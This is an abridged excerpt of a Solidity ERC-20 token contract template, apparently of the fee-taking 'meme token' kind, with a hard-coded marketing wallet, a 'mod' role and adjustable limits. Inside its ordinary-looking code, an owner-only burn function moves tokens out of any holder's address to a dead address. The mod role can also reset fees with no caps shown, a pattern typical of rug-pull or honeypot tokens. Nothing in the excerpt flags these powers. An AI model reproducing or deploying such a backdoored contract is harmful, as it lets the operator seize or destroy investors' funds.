...
contract template is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 marketingFee = 85;  // 8.5%
    uint256 totalFee = 95;      // 9.5%
    ...
    constructor () {
        ...
        _maxWalletSize = _totalSupply / 100; // 1% of total supply at launch to prevent whales
        ...
        marketingFeeReceiver = address(0xe8bD03826EFf373b5874370C5677eF56b1418745); // !!! template
    ...
    modifier mod() {
        require(_mod == _msgSender(), "Message sender does not have necessary modifier permissions");
        _;
    }
    ...
    function setTxLimit(uint256 percent) external mod { 
        require(percent >= 1); // max limit will never be less than 1%
        _maxTxAmount = _totalSupply.mul(percent).div(100);
    }
    
    function setMaxWallet(uint256 percent) external mod {
        require(percent >= 1); // max wallet will never be less than 1%
    ...
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external mod {
    ...
    function activateAntiSnipe() external onlyOwner {
        liquidityFee = 0;
        buybackFee = 0;
        reflectionFee = 0;
    ...
    function burn(address addr, uint256 amount) external onlyOwner {
        _transferFrom(addr, DEAD, amount);
    }
    ...
    function setSwapBackSettings(bool _enabled, uint256 _amount) external mod {
